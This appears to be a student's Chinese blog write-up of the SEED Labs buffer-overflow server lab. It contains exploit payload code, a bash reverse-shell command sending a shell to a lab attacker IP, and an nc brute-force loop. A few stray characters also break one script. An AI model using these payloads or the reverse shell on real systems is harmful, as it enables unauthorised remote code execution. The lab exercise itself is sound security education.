---
title: Buffer-Overflow-Attack-Lab(Server-Version)
categories:
  - SeedLabs/SoftwareSecurity
tags:
  - Buffer-Overflow
abbrlink: a7d9c628
date: 2022-11-14 14:13:03
---

## Lab Environment Setup

1. 下载解压好 Labset.zip 文件
2. 关闭地址随机化，`sudo /sbin/sysctl -w kernel.randomize_va_space=0`
3. 阅读并编译被攻击的程序，`cd server-code && make && make install`
4. 启动容器，`dcbuild && dcup` ，提供的别名只能在 bash 中使用，如果要在 zsh 中用需要自己设置一下 alias

## Task 1: Get Familiar with the Shellcode

```bash
cd shellcode
./shellcode_32.py
./shellcode_64.py
make
./a32.out
./a64.out
```

要实现删除操作，改一改命令就可以了，需要确保长度不变！这里我们熟悉一下 shellcode 的作用就 ok

## Task 2: Level-1 Attack

客户端向服务端发送一个字符串，服务端会将这个字符串作为标准输入，执行 stack 程序，并且把 stack 程序的输出在 dcup 的窗口显示出来。

![image-20221113143729110](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113143729110.png)

我们把 shellcode 复制过来，修改一些参数，实施缓冲区溢出实验。

![image-20221113144245106](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144245106.png)

结果如下，注意每次重启容器，地址都会发生变化，我重启了一下，所以地址和上面的代码不相匹配。

![image-20221113144910199](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113144910199.png)

为了实现反向 shell，只需要把 ls 那一行命令修改为 `/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1` 就 ok 了，剩下的不用动，注意长度。（具体实现原理 shellshock 实验讲过了）

![image-20221113145627558](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113145627558.png)

## Task 3: Level-2 Attack

只知道 buffer 的地址，不知道 ebp 的地址，但是知道 buffer 的大小为 100 到 300，那么 ebp 比 &buffer 最小大 100，最多大 308（感觉是这个数，也可以再大点）。当 ebp 比 &buffer 大 308 时，ret 至少要大 312，所以我们就能取 312。这个数还能再大点，但是太大了也不行，太大了后面就没有空间存 shellcode 了。

```python
ret = 0xffffd4b8 + 312     # Change this number
# offset = 0x70 + 4              # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
for offset in range(100, 312, 4):
    content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')
```

![image-20221113151028713](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113151028713.png)

## Task 4: Level-3 Attack

```python
# Put the shellcode somewhere in the payload
start = 0               # Change this number
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0x00007fffffffe3e0     # Change this number
offset = 216              # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')
```

和 Setuid 版本差不多，不过多了个服务器罢了。难度却大大降低，因为直接把地址都给了，Setuid 版不给地址，只能自己通过 GDB 调试得到地址，并且 GDB 调试出来的地址还和实际运行的地址有偏移。这个就没这种问题，把 shellcode 放最前面就可以了。

![image-20221113152426964](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113152426964.png)

## Task 5: Level-4 Attack

同 Setuid 版，在 main 函数中还有一份字符串啊，所以我们可以调用 main 函数中的那个 shellcode，但是不知道地址，也没法用 GDB。所以只能用暴力法了。k y l

```python
start = 517 - len(shellcode)  # Change this number 放最后面，比较好找到，因为前面是 nop
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0x00007fffffffe4b0 + int(sys.argv[1]) # Change this number 反正比 rbp 要大，大多少不知道了
print(sys.argv[1])
offset = 104              # Change this number

# Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')
```

然后写个小脚本，如下，我这里是每次增加 100，也可以改的更精细一点，这样容错率更高：

```shell
#!/bin/bash

value=0k y l

while true; do
  value=$(( $value + 100 ))
  ./exploit.py $value
  cat badfile | nc 10.9.0.8 9090
done
```

执行情况如下，在偏移 1200 的情况下就可以了：

![image-20221113155358573](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221113155358573.png)

## Task 6: Experimenting with the Address Randomization

打开地址随机化后，每次地址都不一样了，但是对于 32 位地址来说，情况还是有限的，我们可以使用脚本穷举解决问题。脚本已经给了，跑一跑就好了。

## Tasks 7: Experimenting with Other Countermeasures

### Turn on the StackGuard Protection

打开栈溢出保护机制，当存在栈溢出时就会报错。具体实现就是会有一个哨兵在栈底，如果栈溢出了就会改变哨兵的值，检测到哨兵的值发生改变了，那么就会抛出错误。

### Turn on the Non-executable Stack Protection

栈不可执行机制，只是栈不能执行罢了，可以通过 ret2libc 或者 ROP 等技术破解之。

